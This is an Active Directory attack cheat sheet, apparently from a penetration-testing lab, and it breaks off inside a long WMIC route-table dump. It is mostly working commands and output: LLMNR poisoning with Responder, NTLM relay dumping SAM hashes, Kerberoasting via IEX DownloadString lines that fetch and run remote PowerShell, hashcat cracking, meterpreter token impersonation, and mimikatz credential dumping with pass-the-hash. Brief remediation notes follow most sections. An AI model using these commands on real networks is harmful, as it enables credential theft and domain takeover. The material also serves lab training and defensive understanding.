# Active Directory Attacks
Active Directory Cheat Sheet

#### LLMNR/NBT-NS poisoning 

`responder -I eht0 -rdw`
```
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.22.137
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:93b1788c58f638fa:B2CA7875629275D309D734EC71F9E286:0101000000000000C0653150DE09D2013126B37886358E89000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000001000000002000006010A3B377FCEC86F76295A06081F0D3B51DCECFF04B43D87CAF05972C41D0A80A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00320032002E003100380033000000000000000000
```
In order to crack hash run hashcat: `hashcat64.exe -m 5600 hash.txt rockyou.txt`
```
Watchdog: Temperature abort trigger set to 90c
 
Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384
 
FCASTLE::MARVEL:93b1788c58f638fa:b2ca7875629275d309d734ec71f9e286:0101000000000000c0653150de09d2013126b37886358e89000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d201060004000200000008003000300000000000000001000000002000006010a3b377fcec86f76295a06081f0d3b51dcecff04b43d87caf05972c41d0a80a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00320032002e003100380033000000000000000000:Password123
 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: FCASTLE::MARVEL:93b1788c58f638fa:b2ca7875629275d309...000000
Time.Started.....: Fri Jan 10 12:58:20 2020 (0 secs)
Time.Estimated...: Fri Jan 10 12:58:20 2020 (0 secs)

```
Recommendations:

```
Best option is to disable LLMNR and NBT-NS.
If company must use LLMNR and NBT-NS, enable Network Access Control (if attacker cannot access to networ, tha attack can not be performed )
Require Strong user password (e.g. >12 characters in lengt and limit common word usage)
References:
https://cccsecuritycenter.org/remediation/llmnr-nbt-ns
```

#### Token Impersonation (meterpreter)
Requirements: 
- NT AUTHORITY SYSTEM
- meterpreter proc arch = sys arch
```
meterpreter > load incognito 
Loading extension incognito...Success.
meterpreter > list_tokens 
Usage: list_tokens <list_order_option>

Lists all accessible tokens and their privilege level

OPTIONS:

    -g        List tokens by unique groupname
    -u        List tokens by unique username

meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
Font Driver Host\UMFD-2
MARVEL\Administrator
MARVEL\fcastle
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1
Window Manager\DWM-2

Impersonation Tokens Available
========================================
No tokens available

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > impersonate_token MARVEL\\Administrator
[+] Delegation token available
[+] Successfully impersonated user MARVEL\Administrator
```
Recommendations:

```
TBA
```
Ps. If there is possibility to run meterpreter on machine, there is no Antivirus protection or Windows Defender is disabled.
`Enable Windows Defender Real-Timer Protection.`

#### NTLM Relay

Change setings in Responder.conf
```
root@marvel:~# cat /usr/share/responder/Responder.conf 
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On

```
Fire up Responder
`responder -rdwv -I eth0`
Second Terminal  Fire up ntlmrealyx.pl from Impacket
`python ntlmrelayx.py -tf target.txt  -smb2support`

Output from Responder:
```
[HTTP] Sending NTLM authentication request to 192.168.22.213
[HTTP] GET request from: 192.168.22.213   URL: / 
[HTTP] Host             : 192.168.22.183 
[HTTP] NTLMv2 Client   : 192.168.22.213
[HTTP] NTLMv2 Username : MARVEL\fcastle
[HTTP] NTLMv2 Hash     : fcastle::MARVEL:2b2108757091455d:688F63B5623FF9BBC230ACFB596117C4:010100000000000095CBA4840BC2D5014512A438AF3F7D97000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000100000536C39E55E2469C08DAC46B0D5BB77645063D14D65BAE14C2AA4565A39A03E8A0A001000920918B91B320ACA2234D7731132F4070900260048005400540050002F003100390032002E003100360038002E00320032002E003100380033000000000000000000

```
Output from ntlmrelayx.py:
```
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 192.168.22.213, attacking target smb://192.168.22.212
[*] HTTPD: Received connection from 192.168.22.213, attacking target smb://192.168.22.212
[*] Authenticating against smb://192.168.22.212 as MARVEL\fcastle SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Authenticating against smb://192.168.22.212 as MARVEL\fcastle SUCCEED
[-] 'CurrentState'
[*] Target system bootKey: 0x56ae13534cc70dccd75837d753af6890
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:99216251ddf5fa6c4c2761e417f5ad85:::
Peter:1001:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Done dumping SAM hashes for host: 192.168.22.212
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```
Tips:
- Check your Responder certs `Error Code: DLG_FLAGS_INVALID_CA
DLG_FLAGS_SEC_CERT_CN_INVALID`

Recommendations:
```
SMB Signing Disabled is a Medium risk vulnerability and should be Enabled to prevent NTLM Relay Attacks or move to Kerberos as the authentication protocol.
References:
https://beyondsecurity.com/scan-pentest-network-vulnerabilities-smb-signing-disabled.html
https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/
```

#### Kerberoasting

Find SPN in the forest:

```
PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts'); Find-PSServiceAccounts
Discovering service account SPNs in the AD Domain marvel.local


Domain                : marvel.local
UserID                : krbtgt
PasswordLastSet       : 12/30/2019 11:58:57
LastLogon             : 01/01/1601 00:00:00
Description           : Key Distribution Center Service Account
SPNServers            :
SPNTypes              : {kadmin}
ServicePrincipalNames : {kadmin/changepw}

Domain                : marvel.local
UserID                : spn1
PasswordLastSet       : 01/07/2020 08:31:28
LastLogon             : 01/01/1601 00:00:00
Description           :
SPNServers            : {hydra.marvel.local}
SPNTypes              : {http}
ServicePrincipalNames : {http/hydra.marvel.local:80}
```

Performing the attack:

```
PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast


TicketByteHexStream  :
Hash                 : $krb5tgs$http/hydra.marvel.local:80:38E8FD090742C0D1FFA26A56527F2A3F$71AF4E87BBE558A3B1C654A39942586DDD8D1A101E5097113E0F449D0EF39A4FA8BC2778B87CED04DDBDA5D79AA9ED374B08957185B1B636606124127EC6CE9D93A544B0C9B416CCAED7E003ABF5E2FA9EF646279EEAF0F55F
                       B110B3C03B7568DF1A288A627CC5801E425D2F1262A7AB042B67485B08C999CC9DA53414CE7515BDCE4ACD0BB7BAC1372A31B56BB7DC6BD94B553F1375728A9BA3CC0D73786EDF13C7976699289B56EC5ED045E4EFA1024783A0B6B36FC187C344BE3E499C9394BF4B3A8EF15D525A8EBC9C11711DC21A4B33D0575
                       2A0B68AF9339C70D3E8F4B8655A9D37C2E9266075F4BA7D449906E0F587CE3A3B8E8E97A44CA8474E91A468C613EA49D12DCE88C1753DF61536C22E3E060FB30EA2CAD0E58ED0412E4DFCF5BB46E2DBE5F174335B2440EBBB2CC6D28F6C3E691B6EA94B031991F29872D77C387CE5644ECBF70C6C2049319BC64B3A
                       806E0A813A58A9DFC96818CFC7A1B4BB36841E3EADD366ED20F6D90105369F83607FEC5B71F7A9318E0D8CC02E2B03AC271ED4178CEC0FEBF2FCD4DCD0168204AD1A69D2995EB2820F78AF329FEBAE1BB35910C5F968F702E243FBC5AD7297A40D1B0E1A157D73B05773AE46D2E40FC71DA10FADA7C68DE9B24B211
                       C35F73A888BE0E85F4EB451ABB411D6777DA560B3AC28778ACB5C34695F46A32AEA468FE901EFD6EE056D6B22D7A2BC202BF4305D5481F58368DE48E3CA770E154C982D742C133037D524795CD2FD737E9684247C8D00143E82902DF5445E83CE13699E18B51C1C4AED791A643659A490F72F2AA532244057458E3F
                       FEE303A5BEE0858CF6665DCDAD398D7D7ECBBEACBBA4AA96AFC0170AFE01DA2FC651D7D0EA31D00035FCC841ADA4C98B41E1732A4F1A5C663621AF348E47A9F0879254B13F74284905946D5D4ACA752359F9DD492238275D9BB1EED8A4FB78A2DF517BA65C8AD88BFBBFA3855752FBABC9F15F62FD54AE83B25A82A
                       0BDD406F68282D9C57EDA34946BD05276326CF67FE419DD5E7808167B0B92836AADDB8AE1672CC9D65A5F8C7B612C1E443BE80617DC88FC7DE81653807E08C6F8793B6D06773F202F93245DAAC271092A7C3D338D834E3CA7A9FA6A8EABD0E1639ED751BF096EE7B4D2D2D8EB137C78B2EC69006CE77E7B7AD97A52
                       6DBA146E38E2FDE820DDC2DFCEBCD8BD8E767F3B1B5D803E21F59F946934A191F7691441520515A3B2E330CCA07B07B92E210CC14C7EE41C9FCFBF222AF85DFF868786EBFE5D7F445EA26A6CDF3D5D7E174F4B11F13D202BC776237A343460FF204F9882DF372636515C794F56BC117B75F4BE90B2726B49D92B88C
                       74A9FFC7DF6C261E6245106D07AFF7F0B58B3FD77AF25FEF347075D0D1473C32FEC8D55AEC2CA21DE987537B9AFA8458848396269137DAA9FA36D00A2DC33D1C3FD6B1B1AAFFC576F85AD111E1FA818108EDA6D38
SamAccountName       : spn1
DistinguishedName    : CN=spn1,CN=Users,DC=marvel,DC=local
ServicePrincipalName : http/hydra.marvel.local:80
```
In order to crack Kerberos 5 TGS-REP etype 23 hash run hashcat: `hashcat64.exe -m 13100 hash.txt rockyou.txt`

```
Watchdog: Temperature abort trigger set to 90c

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*spn1$marvel.local$http/hydra.marvel.local:80*$14734c7868bb6cc9d5abdf4e6ce271b8$5c3c9febdf1842ad23d347f442fe0520176275b43fc383950fc138a661a8208ecf89c692c733231a7d441704ca913ebfa98d30eb54cfc48b49b815459c62faa6e05b76d996ca5a87632c354696c619c4c8f3c8f64d5e2c59fc375d6319597996192fc421919ed47e1717cb0e955268bd58361eecf806dc8596f28d106922703b9a2d6350d82883e7c64e3b60987ec5f43e28149d0f8a71be2f16993d6f0b1300f1139c4d1824b783660f1042a5afb0080ecf1eab130a76bd24ea3a4a5ea0037cb510cf99fce2c8c20b997188f0b47b50132c2fc190d465b87d7d4c5d56c0abe3710b8cc1dd775bc017917803d63c8ae43d2c944e31280a6fa6095d095fc18d8ab77dc9514214cfe6af299efb490195524c27a4809df215b7b0afd6027ac8d64563b6d67b069f0d026c1be06ea76eca7d2c0a3733ce1e2f18b8ab7404c2e90a83be3e604bf8e1b3d313ddf1bc3dd8d0e3080d59b99793435bce2be0d182273418036f338bb6a567246bd625429691d6084f5f46160226b535836b12f080e00685968ed65f9c948fac3ca9f5dc63b58534de0035cd9c4b82b80e3aa5399aeb43a91f893356106c8f9a2c89293d1c3638d953ddc0ed71b7b245715bbf5dde2c4cef56d00eee02a5bd7c2b3938bb6eecd257e465196044a09cc92f22f4d00bcdf5409784b0bbaf137b14439b60d5badc26984d41917e944193f0ef58fab00abe0cd667d239770245f3ce624fecd57702b33b24ff32945f987354f5aa5b8b5fe514bd691be4335222004112d76eab7d8fda3e1b7e53376a1da3a0e7fc58bff4f8d4f2fb7eb09a07420e09d7881fbdddf962f9da98a5dbeb0b1ab8d8fcddeda5efc85df3f8caced853ee4cdf3680d52a289ee8b85d9410793b7ef2b0bf86f3ce00d80daf0c6904a496f95928a4ea523af30df29613bab42052ae2221103ec1c86b46aca95bbd97377024077be9b6bba68ea62055cedcfc8e2fb26e69996653a06b837900bc2a4cbc817f1b18a0bbd3ce6068a94474fc7dc9a0fce3d9ae667190d072501ce0b8c92460f189766f04fd6fab6a45e8de08d40a7d6c3a96a05b3cdc058473a1e28deeffd574914d86dca3180a030c1d6e40074958ad535a0d3759276412e070aa987d7bc84e72dbb72c41f8f0f3ae221ad2f76d8740538e375a43cde2e6b1394aca0840db94836f72ed1703e1e11b81c51dbe3710e8768d4d05073f042c996e6b338fec59b5f9891163aa09913e346c2423f44dea091152f47969c74434b971cc8d87f021739451fb27a0ffe343e6f36dacda5053d93ea6be7ea95d386bb027bde4b73738603796a9c72c3588e592f994216403340443597ac68e533c274138e1d8d121e6e9f645fa35f10adc33a558dd1bd2e9ea1c0181b971cfb571c76bad6d40d062a1a63951d62c2fcca87740fc0fbe6a502e2e4ddd7d8e8c556e7b70479c5d8ca2af021c84d007e0ce95:Password123

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*spn1$marvel.local$http/hydra.marvel.lo...e0ce95
Time.Started.....: Tue Jan 07 10:12:14 2020 (0 secs)
Time.Estimated...: Tue Jan 07 10:12:14 2020 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 42526.0 kH/s (8.75ms) @ Accel:512 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 983040/14344384 (6.85%)
Rejected.........: 0/983040 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> computer?
Hardware.Mon.#1..: Temp: 47c Util:  4% Core: 960MHz Mem:6801MHz Bus:16

Started: Tue Jan 07 10:12:06 2020
Stopped: Tue Jan 07 10:12:19 2020
```

Recommendations:
```
We recommend ensuring service account passwords are longer than 25 characters.
References:
https://docs.microsoft.com/en-us/windows-server/networking/sdn/security/kerberos-with-spn
```


#### Pass The Hash

```
c:\Users\fcastle\Desktop>mimikatz.exe

    lovekatz 2.2.0 (x64) #18362 Jan  9 2020 19:32:44
  "lolxd" - (oe.eo)

       >       -KATZ
          > https:// ***/

lovekatz # privilege::debug
Privilege '20' OK

lovekatz # sekurlsa::logonPasswords

Authentication Id : 0 ; 5532529 (00000000:00546b71)
Session           : Interactive from 2
User Name         : Administrator
Domain            : MARVEL
Logon Server      : HYDRA
Logon Time        : 1/10/2020 1:55:10 AM
SID               : S-1-5-21-1806573636-3987246654-2051155295-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : MARVEL
         * NTLM     : 58a478135a93ac3bf058a5ea0e8fdb71
         * SHA1     : 0d7d930ac3b1322c8a1142f9b22169d4eef9e855
         * DPAPI    : aceb14854d9c0a836f48b7a1760bd14a
        tspkg :
        kerberos :
         * Username : Administrator
         * Domain   : MARVEL.LOCAL
         * Password : (null)
        ssp :
        CredMAN :
[...]




lovekatz # sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:"C:\Users\fcastle\Desktop\PsExec64.exe \\192.168.22.211 whoami"
user    : Administrator
domain  : MARVEL
program : C:\Users\fcastle\Desktop\PsExec64.exe \\192.168.22.211 whoami
impers. : no
NTLM    : 58a478135a93ac3bf058a5ea0e8fdb71
  |  PID  1984
  |  TID  3820
  |  LSA Process was already R/W
  |  LUID 0 ; 9099117 (00000000:008ad76d)
  \_ msv1_0   - data copy @ 000001E3DDFEA680 : OK !
  \_ kerberos - data copy @ 000001E3DE0715D8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001E3DDF34DE8 (32) -> null
```

Output from second terminal

```
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


marvel\administrator
whoami exited on 192.168.22.211 with error code 0.
```

cme
```
cme smb 192.168.22.211 -u Administrator -H '58a478135a93ac3bf058a5ea0e8fdb71' -x whoami
SMB         192.168.22.211  445    HYDRA            [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:HYDRA) (domain:MARVEL) (signing:True) (SMBv1:True)
SMB         192.168.22.211  445    HYDRA            [+] MARVEL\Administrator 58a478135a93ac3bf058a5ea0e8fdb71 (Pwn3d!)
SMB         192.168.22.211  445    HYDRA            [+] Executed com
```

Recommendations:
```
Implement logon restrictions so your privileged account hashes are never stored where they can be extracted.
References:
https://docs.microsoft.com/pl-pl/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN
```

# Information Gathering WMIC

```
PS C:\Users\pparker> Get-WmiObject  -Class Win32_IP4RouteTable


__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="0.0.0.0",InterfaceIndex=13,Mask="0.0.0.0",NextHop="192.1
                   68.22.2"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="0.0.0.0",InterfaceIndex=13,Mask="
                   0.0.0.0",NextHop="192.168.22.2"
Age              : 14838
Caption          : 0.0.0.0
Description      : 0.0.0.0 - 0.0.0.0 - 192.168.22.2
Destination      : 0.0.0.0
Information      : 0.0
InstallDate      :
InterfaceIndex   : 13
Mask             : 0.0.0.0
Metric1          : 25
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 0.0.0.0
NextHop          : 192.168.22.2
Protocol         : 3
Status           :
Type             : 4
PSComputerName   : SPIDERMAN

__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="127.0.0.0",InterfaceIndex=1,Mask="255.0.0.0",NextHop="0.
                   0.0.0"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="127.0.0.0",InterfaceIndex=1,Mask=
                   "255.0.0.0",NextHop="0.0.0.0"
Age              : 14844
Caption          : 127.0.0.0
Description      : 127.0.0.0 - 255.0.0.0 - 0.0.0.0
Destination      : 127.0.0.0
Information      : 0.0
InstallDate      :
InterfaceIndex   : 1
Mask             : 255.0.0.0
Metric1          : 331
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 127.0.0.0
NextHop          : 0.0.0.0
Protocol         : 2
Status           :
Type             : 3
PSComputerName   : SPIDERMAN

__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="127.0.0.1",InterfaceIndex=1,Mask="255.255.255.255",NextH
                   op="0.0.0.0"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="127.0.0.1",InterfaceIndex=1,Mask=
                   "255.255.255.255",NextHop="0.0.0.0"
Age              : 14844
Caption          : 127.0.0.1
Description      : 127.0.0.1 - 255.255.255.255 - 0.0.0.0
Destination      : 127.0.0.1
Information      : 0.0
InstallDate      :
InterfaceIndex   : 1
Mask             : 255.255.255.255
Metric1          : 331
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 127.0.0.1
NextHop          : 0.0.0.0
Protocol         : 2
Status           :
Type             : 3
PSComputerName   : SPIDERMAN

__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="127.255.255.255",InterfaceIndex=1,Mask="255.255.255.255"
                   ,NextHop="0.0.0.0"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="127.255.255.255",InterfaceIndex=1
                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
Age              : 14844
Caption          : 127.255.255.255
Description      : 127.255.255.255 - 255.255.255.255 - 0.0.0.0
Destination      : 127.255.255.255
Information      : 0.0
InstallDate      :
InterfaceIndex   : 1
Mask             : 255.255.255.255
Metric1          : 331
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 127.255.255.255
NextHop          : 0.0.0.0
Protocol         : 2
Status           :
Type             : 3
PSComputerName   : SPIDERMAN

__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="192.168.22.0",InterfaceIndex=13,Mask="255.255.255.0",Nex
                   tHop="0.0.0.0"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="192.168.22.0",InterfaceIndex=13,M
                   ask="255.255.255.0",NextHop="0.0.0.0"
Age              : 79
Caption          : 192.168.22.0
Description      : 192.168.22.0 - 255.255.255.0 - 0.0.0.0
Destination      : 192.168.22.0
Information      : 0.0
InstallDate      :
InterfaceIndex   : 13
Mask             : 255.255.255.0
Metric1          : 281
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 192.168.22.0
NextHop          : 0.0.0.0
Protocol         : 2
Status           :
Type             : 3
PSComputerName   : SPIDERMAN

__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="192.168.22.212",InterfaceIndex=13,Mask="255.255.255.255"
                   ,NextHop="0.0.0.0"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="192.168.22.212",InterfaceIndex=13
                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
Age              : 79
Caption          : 192.168.22.212
Description      : 192.168.22.212 - 255.255.255.255 - 0.0.0.0
Destination      : 192.168.22.212
Information      : 0.0
InstallDate      :
InterfaceIndex   : 13
Mask             : 255.255.255.255
Metric1          : 281
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 192.168.22.212
NextHop          : 0.0.0.0
Protocol         : 2
Status           :
Type             : 3
PSComputerName   : SPIDERMAN

__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="192.168.22.255",InterfaceIndex=13,Mask="255.255.255.255"
                   ,NextHop="0.0.0.0"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="192.168.22.255",InterfaceIndex=13
                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
Age              : 79
Caption          : 192.168.22.255
Description      : 192.168.22.255 - 255.255.255.255 - 0.0.0.0
Destination      : 192.168.22.255
Information      : 0.0
InstallDate      :
InterfaceIndex   : 13
Mask             : 255.255.255.255
Metric1          : 281
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 192.168.22.255
NextHop          : 0.0.0.0
Protocol         : 2
Status           :
Type             : 3
PSComputerName   : SPIDERMAN

__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=1,Mask="240.0.0.0",NextHop="0.
                   0.0.0"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=1,Mask=
                   "240.0.0.0",NextHop="0.0.0.0"
Age              : 14844
Caption          : 224.0.0.0
Description      : 224.0.0.0 - 240.0.0.0 - 0.0.0.0
Destination      : 224.0.0.0
Information      : 0.0
InstallDate      :
InterfaceIndex   : 1
Mask             : 240.0.0.0
Metric1          : 331
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 224.0.0.0
NextHop          : 0.0.0.0
Protocol         : 2
Status           :
Type             : 3
PSComputerName   : SPIDERMAN

__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=13,Mask="240.0.0.0",NextHop="0
                   .0.0.0"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=13,Mask
                   ="240.0.0.0",NextHop="0.0.0.0"
Age              : 14842
Caption          : 224.0.0.0
Description      : 224.0.0.0 - 240.0.0.0 - 0.0.0.0
Destination      : 224.0.0.0
Information      : 0.0
InstallDate      :
InterfaceIndex   : 13
Mask             : 240.0.0.0
Metric1          : 281
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 224.0.0.0
NextHop          : 0.0.0.0
Protocol         : 2
Status           :
Type             : 3
PSComputerName   : SPIDERMAN

__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=1,Mask="255.255.255.255"
                   ,NextHop="0.0.0.0"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=1
                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
Age              : 14844
Caption          : 255.255.255.255
Description      : 255.255.255.255 - 255.255.255.255 - 0.0.0.0
Destination      : 255.255.255.255
Information      : 0.0
InstallDate      :
InterfaceIndex   : 1
Mask             : 255.255.255.255
Metric1          : 331
Metric2          : -1
Metric3          : -1
Metric4          : -1
Metric5          : -1
Name             : 255.255.255.255
NextHop          : 0.0.0.0
Protocol         : 2
Status           :
Type             : 3
PSComputerName   : SPIDERMAN

__GENUS          : 2
__CLASS          : Win32_IP4RouteTable
__SUPERCLASS     : CIM_LogicalElement
__DYNASTY        : CIM_ManagedSystemElement
__RELPATH        : Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=13,Mask="255.255.255.255
                   ",NextHop="0.0.0.0"
__PROPERTY_COUNT : 18
__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER         : SPIDERMAN
__NAMESPACE      : root\cimv2
